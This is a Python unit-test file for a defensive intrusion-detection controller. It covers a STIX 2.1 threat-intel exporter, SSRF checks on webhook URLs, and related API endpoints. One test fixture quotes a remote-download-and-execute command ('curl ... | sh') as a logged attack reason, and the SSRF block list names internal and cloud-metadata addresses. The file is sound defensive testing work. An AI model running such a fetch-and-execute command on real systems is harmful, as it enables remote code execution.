"""Unit tests for Phase D: STIX 2.1 Cyber Threat Intel Exporter and SIEM Webhook Forwarder."""

import os
import tempfile
import time
import unittest
from unittest.mock import AsyncMock, MagicMock, patch

from fastapi.testclient import TestClient

from controller.api.app import create_app
from controller.api.sse_broker import SSEBroadcaster
from controller.core.db import DefenseDatabase
from controller.core.detector import IntrusionDetector
from controller.core.models import MitigationRecord
from controller.core.stix_exporter import generate_stix_bundle
from controller.core.webhook_notifier import WebhookNotifier, validate_webhook_url
from controller.mitigation.allowlist import AllowlistManager
from controller.mitigation.firewall import FirewallController


class TestStixExporter(unittest.TestCase):
    """Verifies OASIS STIX 2.1 Threat Intel Bundle compliance and ATT&CK mappings."""

    def test_stix_bundle_structure_empty(self) -> None:
        bundle = generate_stix_bundle(history=[], threat_events=[], active_bans=[])
        self.assertEqual(bundle["type"], "bundle")
        self.assertEqual(bundle["spec_version"], "2.1")
        self.assertTrue(bundle["id"].startswith("bundle--"))
        self.assertIsInstance(bundle["objects"], list)

        # Baseline objects: Identity + 4 Attack Patterns + 2 Courses of Action + 4 Relationships = 11 objects
        types = [obj["type"] for obj in bundle["objects"]]
        self.assertIn("identity", types)
        self.assertIn("attack-pattern", types)
        self.assertIn("course-of-action", types)
        self.assertIn("relationship", types)

    def test_stix_bundle_with_mitigation_records(self) -> None:
        history = [
            {
                "id": 1,
                "src_ip": "198.51.100.99",
                "action": "IPTABLES_DROP",
                "reason": "Brute-force attack: 5 failed logins in 30s",
                "severity": "HIGH",
                "timestamp": 1718000000.0,
            },
            {
                "id": 2,
                "src_ip": "203.0.113.88",
                "action": "IPTABLES_DROP",
                "reason": "Critical terminal exploit command: curl -s http://bot.sh | sh",
                "severity": "CRITICAL",
                "timestamp": 1718000010.0,
            },
        ]
        bundle = generate_stix_bundle(history=history, threat_events=[], active_bans=[])
        indicators = [obj for obj in bundle["objects"] if obj["type"] == "indicator"]
        self.assertEqual(len(indicators), 2)

        ip_patterns = [ind["pattern"] for ind in indicators]
        self.assertIn("[ipv4-addr:value = '198.51.100.99']", ip_patterns)
        self.assertIn("[ipv4-addr:value = '203.0.113.88']", ip_patterns)

        # Check relationships link indicators to attack patterns
        relationships = [obj for obj in bundle["objects"] if obj["type"] == "relationship" and obj["relationship_type"] == "indicates"]
        self.assertEqual(len(relationships), 2)


class TestWebhookNotifierAndSSRF(unittest.TestCase):
    """Verifies Webhook SSRF validation, multi-format payloads, and dispatch logic."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.temp_dir.name, "webhook_test.db")
        self.db = DefenseDatabase(db_path=self.db_path)
        self.notifier = WebhookNotifier(db=self.db)

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_validate_webhook_url_blocks_ssrf(self) -> None:
        blocked_targets = [
            "http://127.0.0.1:8000/webhook",
            "http://127.0.0.2/api",
            "http://169.254.169.254/latest/meta-data/",
            "http://172.20.0.1:8050/webhook",
            "http://172.21.0.5/hook",
            "http://192.168.65.1:8000",
            "ftp://external.siem/webhook",
            "not_a_url",
            "",
        ]
        for target in blocked_targets:
            with self.assertRaises(ValueError, msg=f"Should reject: {target}"):
                validate_webhook_url(target)

    def test_validate_webhook_url_allowed_external(self) -> None:
        # Mock getaddrinfo so external hostnames don't rely on live internet DNS in tests
        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [(2, 1, 6, "", ("93.184.216.34", 443))]
            res = validate_webhook_url("https://hooks.slack.com/services/T00/B00/X00")
            self.assertEqual(res, "https://hooks.slack.com/services/T00/B00/X00")

    def test_payload_formatting(self) -> None:
        event = {
            "src_ip": "198.51.100.99",
            "action": "IPTABLES_DROP",
            "reason": "Brute-force attack: 5 failed logins in 30s",
            "severity": "HIGH",
            "timestamp": 1718000000.0,
        }
        generic_p = self.notifier.format_payload(event, "generic")
        self.assertEqual(generic_p["event"], "autonomous_mitigation_alert")
        self.assertEqual(generic_p["target_ip"], "198.51.100.99")

        slack_p = self.notifier.format_payload(event, "slack")
        self.assertIn("198.51.100.99", slack_p["text"])
        self.assertIn("AUTONOMOUS IOT CYBER DEFENSE", slack_p["text"])

        discord_p = self.notifier.format_payload(event, "discord")
        self.assertIn("198.51.100.99", discord_p["content"])

    def test_config_persistence(self) -> None:
        cfg = self.notifier.get_config()
        self.assertFalse(cfg["enabled"])
        self.assertEqual(cfg["url"], "")

        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [(2, 1, 6, "", ("93.184.216.34", 443))]
            self.notifier.update_config(
                url="https://siem.company.org/alerts",
                enabled=True,
                webhook_format="slack",
            )

        updated = self.notifier.get_config()
        self.assertTrue(updated["enabled"])
        self.assertEqual(updated["url"], "https://siem.company.org/alerts")
        self.assertEqual(updated["format"], "slack")


class TestStixAndWebhookEndpoints(unittest.TestCase):
    """End-to-end API tests for STIX export and Webhook configuration endpoints."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.temp_dir.name, "endpoints_test.db")
        self.db = DefenseDatabase(db_path=self.db_path)
        self.allowlist = AllowlistManager()
        self.firewall = FirewallController(allowlist_manager=self.allowlist, dry_run=True)
        self.detector = IntrusionDetector(
            firewall=self.firewall,
            db=self.db,
            allowlist=self.allowlist,
        )
        self.broadcaster = SSEBroadcaster()
        self.app = create_app(
            detector=self.detector,
            quarantine_manager=MagicMock(),
            broadcaster=self.broadcaster,
            enable_tailer=False,
            enable_mqtt=False,
        )
        self.client = TestClient(self.app)

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_export_stix_endpoint(self) -> None:
        # Prepopulate a mitigation record
        self.db.record_mitigation(
            MitigationRecord(
                src_ip="198.51.100.123",
                action="IPTABLES_DROP",
                reason="Brute-force attack: 5 failed logins in 30s",
                severity="HIGH",
                timestamp=time.time(),
            )
        )
        res = self.client.get("/api/defense/export/stix")
        self.assertEqual(res.status_code, 200)
        self.assertIn("application/stix+json", res.headers.get("content-type", ""))
        self.assertIn("attachment; filename=", res.headers.get("content-disposition", ""))
        data = res.json()
        self.assertEqual(data["type"], "bundle")
        self.assertEqual(data["spec_version"], "2.1")
        indicators = [o for o in data["objects"] if o["type"] == "indicator"]
        self.assertEqual(len(indicators), 1)
        self.assertIn("198.51.100.123", indicators[0]["pattern"])

    def test_webhook_config_endpoints(self) -> None:
        # 1. Get initial config
        res = self.client.get("/api/defense/webhook/config")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.json()["data"]["enabled"], False)

        # 2. Update with SSRF URL -> 400
        res_bad = self.client.post(
            "/api/defense/webhook/config",
            json={"url": "http://127.0.0.1:8000/hook", "enabled": True, "format": "generic"},
        )
        self.assertEqual(res_bad.status_code, 400)

        # 3. Update with valid external URL -> 200
        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [(2, 1, 6, "", ("93.184.216.34", 443))]
            res_good = self.client.post(
                "/api/defense/webhook/config",
                json={
                    "url": "https://siem.soc.org/alerts",
                    "enabled": True,
                    "format": "discord",
                },
            )
            self.assertEqual(res_good.status_code, 200)
            data = res_good.json()["data"]
            self.assertEqual(data["url"], "https://siem.soc.org/alerts")
            self.assertEqual(data["format"], "discord")

    def test_webhook_test_probe_endpoint(self) -> None:
        with patch.object(WebhookNotifier, "send_test_webhook", new_callable=AsyncMock) as mock_send:
            mock_send.return_value = {"status_code": 200, "body": "ok"}
            res = self.client.post("/api/defense/webhook/test")
            self.assertEqual(res.status_code, 200)
            self.assertEqual(res.json()["status"], "success")


if __name__ == "__main__":
    unittest.main()
